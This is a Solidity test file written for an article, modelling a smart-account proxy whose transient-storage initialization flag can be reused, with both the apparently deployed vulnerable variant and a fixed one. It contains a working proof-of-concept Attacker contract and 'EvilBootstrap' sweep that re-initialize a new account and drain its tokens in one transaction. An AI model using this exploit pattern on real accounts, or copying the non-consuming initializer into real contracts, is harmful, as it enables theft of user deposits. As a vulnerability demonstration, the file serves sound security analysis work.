// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// Test contracts for an article. Not audited. Do not deploy.
/// A reduced model of the Startale AccountProxy / Initializable pair. `consume = false`
/// follows the deployed code; `consume = true` follows bcnmy/nexus PR #302.

library Init {
    error NotInitializable();

    bytes32 internal constant SLOT = 0x754fd8b321c4649cb777ae6fdce7e89e9cceaa31a4f639795c7807eb7f1a2700;

    function set() internal {
        assembly { tstore(SLOT, 1) }
    }

    function check() internal view {
        assembly {
            if iszero(tload(SLOT)) {
                mstore(0, 0xaed59595)
                revert(0x1c, 4)
            }
        }
    }

    function checkAndConsume() internal {
        check();
        assembly { tstore(SLOT, 0) }
    }
}

contract Token {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 v) external {
        balanceOf[to] += v;
    }

    function transfer(address to, uint256 v) external returns (bool) {
        balanceOf[msg.sender] -= v;
        balanceOf[to] += v;
        return true;
    }
}

contract Impl {
    bool public immutable consume;

    constructor(bool consume_) {
        consume = consume_;
    }

    function initializeAccount(address bootstrap, bytes calldata call_) external {
        if (msg.sender != address(this)) {
            if (consume) {
                Init.checkAndConsume();
            } else {
                Init.check();
            }
        }
        (bool ok, ) = bootstrap.delegatecall(call_);
        require(ok, "bootstrap");
    }
}

contract Proxy {
    address private immutable impl;

    constructor(address impl_, address bootstrap, bytes memory call_) {
        impl = impl_;
        Init.set();
        (bool ok, ) = impl_.delegatecall(abi.encodeCall(Impl.initializeAccount, (bootstrap, call_)));
        require(ok, "init");
    }

    fallback() external payable {
        address i = impl;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), i, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if iszero(ok) { revert(0, returndatasize()) }
            return(0, returndatasize())
        }
    }
}

contract LegitBootstrap {
    function init() external {}
}

contract EvilBootstrap {
    /// Runs in the account's context through DELEGATECALL.
    function sweep(Token t, address to) external {
        t.transfer(to, t.balanceOf(address(this)));
    }
}

/// Deploy, then call `initializeAccount` again, all in one constructor as in the live attack.
contract Attacker {
    address public account;

    constructor(Impl impl, Token token, address legit, address evil, address to) {
        Proxy p = new Proxy(address(impl), legit, abi.encodeCall(LegitBootstrap.init, ()));
        account = address(p);
        // Stands in for the deposit a user made to the counterfactual address.
        token.mint(address(p), 1_000_000);
        Impl(address(p)).initializeAccount(evil, abi.encodeCall(EvilBootstrap.sweep, (token, to)));
    }
}
